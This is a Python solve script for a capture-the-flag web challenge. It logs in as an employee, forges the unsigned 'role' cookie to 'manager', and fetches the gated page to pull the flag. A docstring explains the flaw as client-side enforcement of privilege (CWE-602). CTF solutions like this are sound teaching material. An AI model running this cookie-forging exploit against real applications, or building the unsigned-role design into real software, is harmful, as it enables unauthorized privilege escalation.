#!/usr/bin/env python3
"""
ExpenseFlow (auth, 100) — CWE-602, client-side enforcement of server-side security.

Logging in as a normal employee sets TWO cookies:
  * session = Flask-signed, decodes to {"user":"employee"}  (identity, signed)
  * role    = "employee"                                     (privilege, NOT signed)

The /manager page gates on the plaintext `role` cookie, which the client fully
controls. They signed *who you are* but not *what you may do* — so we keep the
valid signed session and just overwrite role -> "manager".

Usage:
    python3 solve.py                          # defaults to auth4.chal.deti:8063
    python3 solve.py http://auth4.chal.deti:8063
"""
import re
import sys

import requests

BASE = sys.argv[1].rstrip("/") if len(sys.argv) > 1 else "http://auth4.chal.deti:8063"
LOGIN = f"{BASE}/login"
GATED = f"{BASE}/manager"
CREDS = {"username": "employee", "password": "employee123"}
ELEVATED_ROLE = "manager"  # matches the gated /manager page

FLAG_RE = re.compile(r"flag\{[^}]*\}")


def main() -> int:
    s = requests.Session()
    s.post(LOGIN, data=CREDS, timeout=10)
    print(f"[i] logged in; cookies: {s.cookies.get_dict()}")

    # keep the signed session, forge the unsigned privilege cookie
    s.cookies.set("role", ELEVATED_ROLE, domain="auth4.chal.deti")
    print(f"[+] forged role cookie -> {ELEVATED_ROLE}")

    r = s.get(GATED, timeout=10)
    print(f"[{r.status_code}] GET {GATED}")
    m = FLAG_RE.search(r.text)
    if m:
        print(f"[+] FLAG: {m.group(0)}")
        return 0
    print("[!] no flag in response — dumping page head:\n")
    print(r.text[:2000])
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
